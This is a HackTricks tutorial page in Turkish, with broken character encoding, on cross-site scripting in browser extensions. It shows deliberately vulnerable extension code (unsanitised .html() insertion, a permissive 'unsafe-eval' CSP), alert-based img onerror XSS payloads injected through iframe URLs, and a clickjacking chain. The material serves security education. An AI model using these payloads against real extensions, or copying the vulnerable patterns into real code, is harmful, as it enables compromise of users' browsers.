# BrowExt - XSS Ã–rneÄŸi

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Iframe Ãœzerinden Cross-Site Scripting (XSS)

Bu yapÄ±landÄ±rmada, bir **iÃ§erik betiÄŸi** bir Iframe oluÅŸturmak iÃ§in uygulanÄ±r ve Iframe'in kaynaÄŸÄ± olarak sorgu parametreleri iÃ§eren bir URL kullanÄ±lÄ±r:
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
Herkese aÃ§Ä±k bir HTML sayfasÄ±, **`message.html`**, URL'deki parametrelere dayalÄ± olarak belge gÃ¶vdesine dinamik olarak iÃ§erik eklemek iÃ§in tasarlanmÄ±ÅŸtÄ±r:
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
KÃ¶tÃ¼ niyetli bir betik, bir dÃ¼ÅŸmanÄ±n sayfasÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r ve **XSS yÃ¼kÃ¼** eklemek iÃ§in Iframe'in kaynaÄŸÄ±nÄ±n `content` parametresi deÄŸiÅŸtirilir. Bu, Iframe'in kaynaÄŸÄ±nÄ± zararlÄ± bir betik iÃ§erecek ÅŸekilde gÃ¼ncelleyerek gerÃ§ekleÅŸtirilir:
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
AÅŸÄ±rÄ± izin veren bir Ä°Ã§erik GÃ¼venlik PolitikasÄ±, Ã¶rneÄŸin:
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
JavaScript'in Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±na izin verir, bu da sistemi XSS saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z hale getirir.

XSS'i provoke etmenin alternatif bir yaklaÅŸÄ±mÄ±, bir Iframe Ã¶ÄŸesi oluÅŸturmak ve kaynaÄŸÄ±nÄ± `content` parametresi olarak zararlÄ± scripti iÃ§erecek ÅŸekilde ayarlamaktÄ±r:
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM tabanlÄ± XSS + ClickJacking

Bu Ã¶rnek [orijinal yazÄ±dan](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/) alÄ±nmÄ±ÅŸtÄ±r.

Temel sorun, **`/html/bookmarks.html`** dosyasÄ±nda bulunan bir DOM tabanlÄ± Cross-site Scripting (XSS) aÃ§Ä±ÄŸÄ±ndan kaynaklanmaktadÄ±r. AÅŸaÄŸÄ±da detaylandÄ±rÄ±lan sorunlu JavaScript, **`bookmarks.js`** dosyasÄ±nÄ±n bir parÃ§asÄ±dÄ±r:
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
Bu kod parÃ§asÄ± **`txtName`** giriÅŸ alanÄ±ndan **deÄŸeri** alÄ±r ve **HTML oluÅŸturmak iÃ§in dize birleÅŸtirmesi kullanÄ±r**, ardÄ±ndan bu HTML, jQueryâ€™nin `.append()` fonksiyonu kullanÄ±larak DOM'a eklenir.

Genellikle, Chrome uzantÄ±sÄ±nÄ±n Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) bu tÃ¼r zafiyetleri Ã¶nler. Ancak, **â€˜unsafe-evalâ€™ ile CSP gevÅŸetmesi** ve jQueryâ€™nin DOM manipÃ¼lasyon yÃ¶ntemlerinin kullanÄ±mÄ± (bu yÃ¶ntemler, DOM eklenmesi sÄ±rasÄ±nda scriptleri [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) ile geÃ§mek iÃ§in [`globalEval()`](https://api.jquery.com/jquery.globaleval/) kullanÄ±r) nedeniyle, istismar hala mÃ¼mkÃ¼ndÃ¼r.

Bu zafiyet Ã¶nemli olsa da, istismarÄ± genellikle kullanÄ±cÄ± etkileÅŸimine baÄŸlÄ±dÄ±r: sayfayÄ± ziyaret etmek, bir XSS yÃ¼kÃ¼ girmek ve â€œEkleâ€ butonunu etkinleÅŸtirmek.

Bu zafiyeti artÄ±rmak iÃ§in, ikincil bir **clickjacking** zafiyeti istismar edilir. Chrome uzantÄ±sÄ±nÄ±n manifesti, kapsamlÄ± bir `web_accessible_resources` politikasÄ±nÄ± sergilemektedir:
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
Ã–zellikle, **`/html/bookmarks.html`** sayfasÄ± Ã§erÃ§evelemeye karÅŸÄ± hassastÄ±r, bu nedenle **clickjacking**'e karÅŸÄ± savunmasÄ±zdÄ±r. Bu zafiyet, sayfayÄ± bir saldÄ±rganÄ±n sitesinde Ã§erÃ§evelemek iÃ§in kullanÄ±lÄ±r ve arayÃ¼zÃ¼ yanÄ±ltÄ±cÄ± bir ÅŸekilde yeniden tasarlamak iÃ§in DOM Ã¶ÄŸeleri ile Ã¶rtÃ¼lÃ¼r. Bu manipÃ¼lasyon, kurbanlarÄ±n istemeden altta yatan uzantÄ±yla etkileÅŸimde bulunmasÄ±na yol aÃ§ar.

## Referanslar

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
